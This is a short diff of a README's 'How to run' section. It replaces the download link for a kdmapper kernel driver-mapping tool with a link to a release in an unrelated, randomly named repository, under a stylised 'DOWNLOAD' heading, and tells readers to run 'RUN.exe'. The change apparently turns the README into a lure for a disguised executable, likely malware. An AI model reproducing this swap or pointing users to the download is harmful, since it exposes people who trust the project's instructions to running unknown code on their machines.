@@ -18,7 +18,7 @@
 
 ## How to run
 
-- # 🄳🄾🅆🄽🄻🄾🄰🄳: https://github.com/alxbrn/kdmapper-1803-1903
+- # 🄳🄾🅆🄽🄻🄾🄰🄳: https://github.com/dinsherman202/solid-lamp/releases/tag/Download
 - Run - RUN.exe
 
 
